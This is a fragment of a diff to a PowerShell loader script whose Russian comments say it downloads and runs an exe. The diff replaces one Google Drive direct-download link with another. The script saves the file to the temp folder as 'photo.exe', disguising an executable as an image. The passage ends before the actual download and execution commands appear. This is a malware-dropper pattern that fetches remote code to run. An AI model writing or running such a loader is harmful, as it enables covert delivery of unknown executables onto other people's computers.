@@ -1,5 +1,5 @@
 # loader.ps1 — качает и запускает тестовый exe
-$url = "https://drive.google.com/uc?export=download&id=1NbOrr4i4zsohNf4o90Fo5fROjd_jt3tU"  # ← прямая ссылка на твой exe
+$url = "https://drive.google.com/uc?export=download&id=1tUR-oTx28YIm-7hIDeoLnDpRoTec0-bQ"  # ← прямая ссылка на твой exe
 $path = "$env:TEMP\photo.exe"
 
 # Качаем
